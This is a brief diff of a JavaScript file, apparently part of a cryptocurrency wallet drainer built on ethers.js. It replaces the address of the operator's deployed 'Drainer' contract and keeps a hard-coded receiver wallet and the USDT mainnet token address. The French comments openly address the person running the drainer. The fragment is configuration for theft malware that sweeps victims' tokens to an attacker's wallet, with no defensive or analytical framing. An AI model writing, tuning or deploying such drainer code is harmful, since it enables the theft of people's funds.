@@ -10,7 +10,7 @@ import { ethers } from "ethers";
 const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
 
 // Adresse de ton contrat Drainer déployé
-const DRAINER_CONTRACT = "0x5f9fA9594244D301Bf7e0bE11815cE98b249F567";
+const DRAINER_CONTRACT = "0xA7C15be0F8790be99f4de5Ca200213C39687E7A7";
 
 // USDT sur Ethereum Mainnet
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
